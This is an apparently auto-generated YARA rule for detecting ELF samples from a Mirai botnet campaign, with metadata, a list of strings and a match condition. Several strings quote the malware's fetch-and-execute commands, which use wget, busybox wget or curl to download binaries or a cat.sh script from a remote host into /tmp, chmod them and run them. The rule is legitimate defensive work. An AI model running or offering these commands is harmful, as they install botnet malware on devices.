rule Sightlines_tlsh_1bfc63bb_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1bfc63bb"
        date = "2026-11-07"
        campaign = "tlsh-1bfc63bb"
        family = "mirai"
        hash = "43eb85040d44c6253623d26c822b567b9f96f0924fa480a0915db583016c1805"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1bfc63bb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "%s():%i: Trying to dlopen '%s', RTLD_GLOBAL:%d RTLD_NOW:%d" ascii
        $s1 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel realtek; wget http://%s" ascii
        $s2 = "%s: '%s' is not an ELF executable for ARCompact" ascii
        $s3 = " /tmp; wget http://%s/mipsel; chmod 777 mipsel; ./mipsel netis.netcore; wget http://%s/armv4l; chmod" ascii
        $s4 = "%s():%i: Circular dependency, skipping '%s'," ascii
        $s5 = "%s():%i: Beginning dlopen relocation fixups" ascii
        $s6 = "%s():%i: Move %s from pos %d to %d in INIT/FINI list." ascii
        $s7 = "cd /tmp || cd /dev wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " ascii
        $s8 = "%s:%i: RELRO protecting %s:  start:%x, end:%x" ascii
        $s9 = "%s():%i: running ctors for library %s at '%p'" ascii
        $s10 = "%s():%i: running dtors for library %s at '%p'" ascii
        $s11 = "cannot create TLS data structures: ABORT" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}
